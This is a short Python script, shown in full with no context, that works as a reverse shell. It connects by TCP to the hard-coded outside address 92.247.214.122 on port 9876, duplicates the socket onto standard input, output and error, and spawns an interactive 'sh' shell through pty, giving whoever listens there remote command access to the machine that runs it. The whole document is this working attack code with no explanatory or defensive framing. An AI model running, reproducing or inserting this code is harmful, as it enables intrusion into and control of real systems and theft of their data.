import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("92.247.214.122",9876));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")
